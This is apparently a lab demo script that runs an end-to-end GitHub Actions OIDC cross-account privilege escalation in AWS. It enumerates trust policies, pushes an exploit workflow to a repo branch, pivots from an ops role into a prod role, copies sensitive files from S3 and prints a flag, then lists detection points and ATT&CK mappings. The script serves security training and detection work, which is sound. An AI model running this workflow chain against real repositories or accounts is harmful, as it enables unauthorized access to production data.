#!/bin/bash

# Demo script for github-oidc-cross-account-pivot
# This scenario demonstrates how GitHub repo write access enables OIDC assumption of an ops
# deployer role that pivots cross-account into a prod deployer role with S3 read access on
# a sensitive bucket.
#
# This script performs the full end-to-end exploit:
#   1. Enumerates the attack surface (OIDC provider, role trust policies, target bucket)
#   2. Reads the configured GitHub repo from ~/.plabs/plabs.yaml
#   3. Clones the repo, pushes an exploit GitHub Actions workflow to a temporary branch
#   4. Waits for the workflow to assume both roles and read the flag from S3
#   5. Extracts and displays the flag from the workflow run logs
#   6. Cleans up the exploit branch
#
# Requirements:
#   - git (for cloning and pushing via SSH — requires SSH key authorized for the repo)
#   - gh (GitHub CLI, authenticated with write access to the configured repo, for triggering and watching workflows)
#   - jq

set -e

export AWS_PAGER=""

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
DIM='\033[2m'
NC='\033[0m'

ATTACK_COMMANDS=()
EXPLOIT_BRANCH=""
EXPLOIT_CLONE_DIR=""

show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Cleanup the exploit branch and tmp clone on exit (covers Ctrl+C / early exit)
cleanup_exploit_artifacts() {
    if [ -n "$EXPLOIT_BRANCH" ] && [ -n "$EXPLOIT_CLONE_DIR" ] && [ -d "$EXPLOIT_CLONE_DIR" ]; then
        echo -e "\n${YELLOW}Cleaning up exploit branch $EXPLOIT_BRANCH...${NC}"
        cd "$EXPLOIT_CLONE_DIR"
        git push origin --delete "$EXPLOIT_BRANCH" 2>/dev/null || true
        cd /
        rm -rf "$EXPLOIT_CLONE_DIR"
        echo -e "${GREEN}✓ Exploit branch and clone removed${NC}"
    fi
}
trap cleanup_exploit_artifacts EXIT

OPS_DEPLOYER_ROLE="pl-ops-goidc-pivot-deployer-role"
PROD_DEPLOYER_ROLE="pl-prod-goidc-pivot-deployer-role"

echo -e "${GREEN}============================================================${NC}"
echo -e "${GREEN}GitHub Actions OIDC Cross-Account Pivot Demo${NC}"
echo -e "${GREEN}============================================================${NC}\n"

echo -e "${BLUE}This scenario demonstrates a cross-account privilege escalation path where:${NC}"
echo "  1. An attacker with write access to a trusted GitHub repo"
echo "  2. Creates a GitHub Actions workflow that assumes the ops OIDC role"
echo "  3. Pivots cross-account into the prod deployer role"
echo "  4. Reads sensitive data from a private S3 bucket in prod"
echo ""

# =============================================================================
# Step 1: Retrieve configuration from Terraform grouped outputs
# =============================================================================
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd "$(git rev-parse --show-toplevel)"

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.cross_account_ops_to_prod_github_oidc_pivot.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output 'cross_account_ops_to_prod_github_oidc_pivot'${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

OPS_DEPLOYER_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.ops_deployer_role_arn')
PROD_DEPLOYER_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.prod_deployer_role_arn')
FLAG_BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.flag_bucket_name')
GITHUB_OIDC_PROVIDER_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.github_oidc_provider_arn')

if [ "$OPS_DEPLOYER_ROLE_ARN" = "null" ] || [ -z "$OPS_DEPLOYER_ROLE_ARN" ]; then
    echo -e "${RED}Error: Could not extract ops_deployer_role_arn from terraform output${NC}"
    exit 1
fi

OPS_READONLY_ACCESS_KEY=$(terraform output -raw operations_readonly_user_access_key_id 2>/dev/null)
OPS_READONLY_SECRET_KEY=$(terraform output -raw operations_readonly_user_secret_access_key 2>/dev/null)
PROD_ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
PROD_ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "us-east-1")
OPS_ACCOUNT_ID=$(echo "$OPS_DEPLOYER_ROLE_ARN" | cut -d':' -f5)
PROD_ACCOUNT_ID=$(echo "$PROD_DEPLOYER_ROLE_ARN" | cut -d':' -f5)

echo "Ops Deployer Role ARN:  $OPS_DEPLOYER_ROLE_ARN"
echo "Prod Deployer Role ARN: $PROD_DEPLOYER_ROLE_ARN"
echo "Flag Bucket:            $FLAG_BUCKET_NAME"
echo "Region:                 $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

cd - > /dev/null

# =============================================================================
# Step 2: Read the configured GitHub repo from ~/.plabs/plabs.yaml
# =============================================================================
echo -e "${YELLOW}Step 2: Reading GitHub repo from plabs config${NC}"

PLABS_CONFIG="$HOME/.plabs/plabs.yaml"
if [ ! -f "$PLABS_CONFIG" ]; then
    echo -e "${RED}Error: ~/.plabs/plabs.yaml not found. Run 'plabs init' first.${NC}"
    exit 1
fi

GITHUB_REPO=$(grep -A5 'github-oidc-cross-account-pivot:' "$PLABS_CONFIG" 2>/dev/null \
    | grep 'github_repo:' | head -1 | sed 's/.*github_repo:[[:space:]]*//')

if [ -z "$GITHUB_REPO" ]; then
    echo -e "${RED}Error: github_repo not configured for this scenario.${NC}"
    echo "Set it with: plabs config github-oidc-cross-account-pivot set github_repo org/repo"
    exit 1
fi

echo "GitHub Repo: $GITHUB_REPO"
echo -e "${GREEN}✓ Repo configured${NC}\n"

# =============================================================================
# Step 3: Verify prerequisites (git, gh, auth)
# =============================================================================
echo -e "${YELLOW}Step 3: Checking prerequisites${NC}"

if ! command -v git &>/dev/null; then
    echo -e "${RED}Error: git is required but not installed${NC}"
    exit 1
fi

if ! command -v gh &>/dev/null; then
    echo -e "${RED}Error: gh (GitHub CLI) is required but not installed.${NC}"
    echo "Install: https://cli.github.com"
    exit 1
fi

if ! gh auth status &>/dev/null; then
    echo -e "${RED}Error: gh is not authenticated. Run: gh auth login${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Prerequisites satisfied${NC}\n"

# =============================================================================
# Credential helpers
# =============================================================================
use_ops_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$OPS_READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$OPS_READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
    export AWS_REGION=$AWS_REGION
}
use_prod_admin_creds() {
    export AWS_ACCESS_KEY_ID="$PROD_ADMIN_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$PROD_ADMIN_SECRET_KEY"
    unset AWS_SESSION_TOKEN
    export AWS_REGION=$AWS_REGION
}

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# =============================================================================
# Step 4: Enumerate the OIDC provider in ops
# =============================================================================
echo -e "${YELLOW}Step 4: Enumerating the GitHub OIDC provider in the operations account${NC}"
use_ops_readonly_creds

show_cmd "ReadOnly/Ops" "aws iam get-open-id-connect-provider --open-id-connect-provider-arn $GITHUB_OIDC_PROVIDER_ARN"
aws iam get-open-id-connect-provider \
    --open-id-connect-provider-arn "$GITHUB_OIDC_PROVIDER_ARN" 2>/dev/null \
    || echo "(iam:GetOpenIDConnectProvider not available to readonly user)"
echo ""
echo -e "${GREEN}✓ OIDC provider confirmed: token.actions.githubusercontent.com${NC}"
echo "  The ops account trusts GitHub Actions tokens from this OIDC provider."
echo ""

# =============================================================================
# Step 5: Inspect the ops deployer role trust policy
# =============================================================================
echo -e "${YELLOW}Step 5: Inspecting the ops deployer role trust policy${NC}"

show_cmd "ReadOnly/Ops" "aws iam get-role --role-name $OPS_DEPLOYER_ROLE --query 'Role.AssumeRolePolicyDocument'"
aws iam get-role \
    --role-name "$OPS_DEPLOYER_ROLE" \
    --query 'Role.AssumeRolePolicyDocument' \
    --output json 2>/dev/null
echo ""
echo -e "${YELLOW}Key finding:${NC} The trust policy uses StringLike on the sub-claim."
echo "  Any workflow in $GITHUB_REPO can exchange a GitHub OIDC token for ops credentials."
echo ""

# =============================================================================
# Step 6: Inspect the ops deployer role permissions
# =============================================================================
echo -e "${YELLOW}Step 6: Inspecting the ops deployer role permissions${NC}"

show_cmd "ReadOnly/Ops" "aws iam list-attached-role-policies --role-name $OPS_DEPLOYER_ROLE"
aws iam list-attached-role-policies --role-name "$OPS_DEPLOYER_ROLE" 2>/dev/null

POLICY_NAME=$(aws iam list-role-policies --role-name "$OPS_DEPLOYER_ROLE" --query 'PolicyNames[0]' --output text 2>/dev/null)
if [ -n "$POLICY_NAME" ] && [ "$POLICY_NAME" != "None" ]; then
    show_cmd "ReadOnly/Ops" "aws iam get-role-policy --role-name $OPS_DEPLOYER_ROLE --policy-name $POLICY_NAME"
    aws iam get-role-policy \
        --role-name "$OPS_DEPLOYER_ROLE" \
        --policy-name "$POLICY_NAME" \
        --query 'PolicyDocument' --output json 2>/dev/null
fi
echo ""
echo -e "${YELLOW}Key finding:${NC} ops deployer can sts:AssumeRole on the prod deployer role."
echo "  This is the cross-account pivot permission."
echo ""

# =============================================================================
# Step 7: Inspect the prod deployer role trust policy
# =============================================================================
echo -e "${YELLOW}Step 7: Inspecting the prod deployer role trust policy (prod account)${NC}"
use_prod_admin_creds

show_cmd "Admin/Prod" "aws iam get-role --role-name $PROD_DEPLOYER_ROLE --query 'Role.AssumeRolePolicyDocument'"
aws iam get-role \
    --role-name "$PROD_DEPLOYER_ROLE" \
    --query 'Role.AssumeRolePolicyDocument' \
    --output json 2>/dev/null
echo ""
echo -e "${YELLOW}Key finding:${NC} Prod deployer trusts ONLY the specific ops deployer ARN:"
echo "  $OPS_DEPLOYER_ROLE_ARN"
echo ""

# =============================================================================
# Step 8: Confirm the flag bucket exists
# =============================================================================
echo -e "${YELLOW}Step 8: Confirming the target bucket exists in prod${NC}"

show_cmd "Admin/Prod" "aws s3 ls s3://$FLAG_BUCKET_NAME/"
aws s3 ls "s3://$FLAG_BUCKET_NAME/" 2>/dev/null
echo -e "${GREEN}✓ Flag bucket confirmed: $FLAG_BUCKET_NAME${NC}\n"

# =============================================================================
# Step 9: EXPLOIT — push a GitHub Actions workflow and execute the attack
# =============================================================================
echo -e "${GREEN}============================================================${NC}"
echo -e "${GREEN}EXPLOIT: Pushing GitHub Actions Workflow to $GITHUB_REPO${NC}"
echo -e "${GREEN}============================================================${NC}\n"

EXPLOIT_BRANCH="pl-oidc-exploit-$(date +%s)"
EXPLOIT_CLONE_DIR="/tmp/pl-oidc-exploit-$$"
WORKFLOW_NAME="pl-oidc-pivot-exploit"
WORKFLOW_FILE=".github/workflows/${WORKFLOW_NAME}.yml"

echo -e "${YELLOW}Cloning $GITHUB_REPO to $EXPLOIT_CLONE_DIR${NC}"
show_attack_cmd "Attacker" "git clone git@github.com:${GITHUB_REPO}.git $EXPLOIT_CLONE_DIR"
git clone "git@github.com:${GITHUB_REPO}.git" "$EXPLOIT_CLONE_DIR"
cd "$EXPLOIT_CLONE_DIR"

echo ""
show_attack_cmd "Attacker" "git checkout -b $EXPLOIT_BRANCH"
git checkout -b "$EXPLOIT_BRANCH"
echo ""

# Write the exploit workflow with real ARNs and bucket name.
# Uses workflow_dispatch so we can trigger it explicitly after pushing.
mkdir -p ".github/workflows"
cat > "$WORKFLOW_FILE" <<WORKFLOW
name: ${WORKFLOW_NAME}
on:
  push:
jobs:
  exploit:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Assume ops deployer role via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${OPS_DEPLOYER_ROLE_ARN}
          aws-region: ${AWS_REGION}

      - name: Verify ops identity
        run: aws sts get-caller-identity

      - name: Pivot to prod deployer role and read flag
        run: |
          CREDS=\$(aws sts assume-role \
            --role-arn ${PROD_DEPLOYER_ROLE_ARN} \
            --role-session-name GitHubOIDCPivot \
            --output json)
          export AWS_ACCESS_KEY_ID=\$(echo \$CREDS | jq -r .Credentials.AccessKeyId)
          export AWS_SECRET_ACCESS_KEY=\$(echo \$CREDS | jq -r .Credentials.SecretAccessKey)
          export AWS_SESSION_TOKEN=\$(echo \$CREDS | jq -r .Credentials.SessionToken)
          aws sts get-caller-identity
          aws s3 cp s3://${FLAG_BUCKET_NAME}/sensitive-data.txt /tmp/sensitive-data.txt
          aws s3 cp s3://${FLAG_BUCKET_NAME}/flag.txt /tmp/flag.txt

      - name: Display flag
        run: |
          echo "=== FLAG CONTENTS ==="
          cat /tmp/flag.txt
          echo "=== END FLAG ==="
WORKFLOW

echo -e "${YELLOW}Workflow file written to $WORKFLOW_FILE:${NC}"
cat "$WORKFLOW_FILE"
echo ""

show_attack_cmd "Attacker" "git add $WORKFLOW_FILE && git commit -m 'exploit: oidc pivot' && git push origin $EXPLOIT_BRANCH"
git add "$WORKFLOW_FILE"
git commit -m "exploit: oidc pivot to prod s3"
git push origin "$EXPLOIT_BRANCH"
echo ""
echo -e "${GREEN}✓ Exploit branch pushed.${NC}\n"

# =============================================================================
# Step 10: Trigger and monitor the workflow run
# =============================================================================
echo -e "${YELLOW}Step 10: Triggering and monitoring workflow run${NC}"

# Poll for the run ID — GitHub needs a few seconds to register a push-triggered run
RUN_ID=""
echo -e "${YELLOW}Waiting for GitHub to register the workflow run...${NC}"
for i in $(seq 1 12); do
    sleep 5
    RUN_ID=$(gh run list \
        --repo "$GITHUB_REPO" \
        --branch "$EXPLOIT_BRANCH" \
        --limit 1 \
        --json databaseId \
        -q '.[0].databaseId' 2>/dev/null || true)
    if [ -n "$RUN_ID" ] && [ "$RUN_ID" != "null" ]; then
        break
    fi
    echo -e "${DIM}  ...still waiting (${i}/12)${NC}"
done

if [ -z "$RUN_ID" ] || [ "$RUN_ID" = "null" ]; then
    echo -e "${RED}Error: Workflow run did not appear after 60s.${NC}"
    echo "Check GitHub Actions in the repo directly: https://github.com/$GITHUB_REPO/actions"
    exit 1
fi

echo "Run ID: $RUN_ID"
echo -e "${YELLOW}Watching workflow run (this takes ~60 seconds)...${NC}\n"

show_attack_cmd "Attacker" "gh run watch $RUN_ID --repo $GITHUB_REPO"
gh run watch "$RUN_ID" --repo "$GITHUB_REPO" --exit-status || {
    echo -e "${RED}Workflow run failed. Fetching logs to diagnose:${NC}"
    gh run view "$RUN_ID" --repo "$GITHUB_REPO" --log-failed 2>/dev/null | tail -50
    exit 1
}

echo ""
echo -e "${GREEN}✓ Workflow completed successfully${NC}\n"

# Extract the flag from the run logs
echo -e "${YELLOW}Extracting flag from workflow logs...${NC}"
RUN_LOG=$(gh run view "$RUN_ID" --repo "$GITHUB_REPO" --log 2>/dev/null)

FLAG_CONTENT=$(echo "$RUN_LOG" | awk '/=== FLAG CONTENTS ===/,/=== END FLAG ===/' | grep -v '===')

if [ -z "$FLAG_CONTENT" ]; then
    echo -e "${YELLOW}Could not auto-extract flag. Showing relevant log lines:${NC}"
    echo "$RUN_LOG" | grep -A5 "FLAG" | head -20
else
    echo ""
    echo -e "${GREEN}============================================================${NC}"
    echo -e "${GREEN}FLAG RETRIEVED${NC}"
    echo -e "${GREEN}============================================================${NC}"
    echo -e "${CYAN}$FLAG_CONTENT${NC}"
    echo -e "${GREEN}============================================================${NC}\n"
fi

# =============================================================================
# Restore permissions and cleanup is handled by the EXIT trap
# =============================================================================
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}============================================================${NC}"
echo -e "${GREEN}ATTACK COMPLETE — FLAG CAPTURED${NC}"
echo -e "${GREEN}============================================================${NC}"
echo -e "\n${YELLOW}Attack Path Executed:${NC}"
echo "  GitHub repo write access ($GITHUB_REPO)"
echo "    → [sts:AssumeRoleWithWebIdentity via OIDC]"
echo "    → ops:$OPS_DEPLOYER_ROLE  (account $OPS_ACCOUNT_ID)"
echo "    → [sts:AssumeRole cross-account]"
echo "    → prod:$PROD_DEPLOYER_ROLE  (account $PROD_ACCOUNT_ID)"
echo "    → s3:GetObject on s3://$FLAG_BUCKET_NAME/flag.txt"

echo -e "\n${YELLOW}Key Commands:${NC}"
for cmd in "${ATTACK_COMMANDS[@]}"; do
    echo -e "  ${CYAN}\$ ${cmd}${NC}"
done

echo -e "\n${YELLOW}What a CSPM Tool Should Detect:${NC}"
echo "  1. GitHub OIDC provider in ops account — any workflow in $GITHUB_REPO can assume ops role"
echo "  2. Ops deployer role has cross-account sts:AssumeRole into prod"
echo "  3. Prod deployer role has s3:GetObject on a sensitive bucket"
echo "  4. The compound path: external CI/CD identity → ops account → prod account → S3 data"

echo -e "\n${YELLOW}MITRE ATT&CK:${NC}"
echo "  T1078.004 - Valid Accounts: Cloud Accounts"
echo "  T1550.001 - Use Alternate Authentication Material: Application Access Token"

echo -e "\n${YELLOW}Run cleanup_attack.sh to verify no persistent artifacts remain.${NC}\n"

touch "$(dirname "$0")/.demo_active"
